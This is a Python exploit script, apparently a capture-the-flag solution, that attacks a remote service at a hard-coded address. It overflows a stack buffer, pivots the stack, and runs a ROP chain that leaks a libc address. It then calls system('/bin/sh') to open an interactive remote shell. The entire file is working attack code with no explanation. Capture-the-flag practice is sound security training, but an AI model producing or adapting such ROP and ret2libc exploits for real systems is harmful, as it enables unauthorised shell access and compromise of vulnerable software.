import pwnbox,struct
pack =lambda x: struct.pack("<I",x)
unpack = lambda x : struct.unpack("<I",x)[0]
p = pwnbox.pipe.SocketPipe("1.224.175.11", 10010)
#p = pwnbox.pipe.ProcessPipe("/home/prob/random")
def login(name,pw):
  p.read_until("[+] select :")
  p.write("2\n")
  p.read_until(":")
  p.write(name+"\n")
  p.read_until(":")
  p.write(pw+"\n")
  p.write("\n")

def game():
  p.read_until("[+] select :")
  p.write("3\n")
  p.read_until(":")
  p.write("1\n")
  p.write("\n")
login("kaist_daramg","asdf")
p.read_until("[+] select :")
p.write("5\n")
p.read_until(":")
p.write("yes\n")
p.read_until(":")

EIP = pack(0x080491c2)
EBP = pack(0x0804d070)

MAIN = pack(0x0804d350)
leave_ret = 0x08049875
write_ptr = 0x80488f0
read_ptr = 0x08048940
pppr = 0x0804938c
rop = ""
rop += pack(write_ptr)
rop += pack(pppr)
rop += pack(1)
rop += pack(0x804D00C)
rop += pack(4)
rop += pack(read_ptr)
rop += pack(pppr)
rop += pack(0)
rop += pack(0x804d0ac)
rop += pack(0x400)

pay = pack(pppr+3)*5+pack(pppr)+"\x00"*0x2+pack(leave_ret)+pack(pppr)*2+pack(leave_ret)+"AAAA"+rop
#pay = "A"*6+pack(0x080491ae)
p.write("A"*0x34+EBP+EIP+MAIN+"\n")
p.read_until("[+] search user? (yes or no) : ")
p.write("no\n")
p.write(pay+"\n")
libc = unpack(p.read_byte(4)) - 0x0004d490
system = libc + 0x40310
binsh = 0x804d0ac+0x230

data = pack(pppr+3)*(0x200/4)+pack(system)+pack(binsh)*2
data = data.ljust(0x230,"\x41")
data += "/bin/sh\x00"
p.write(data+"\n")

p.interact()
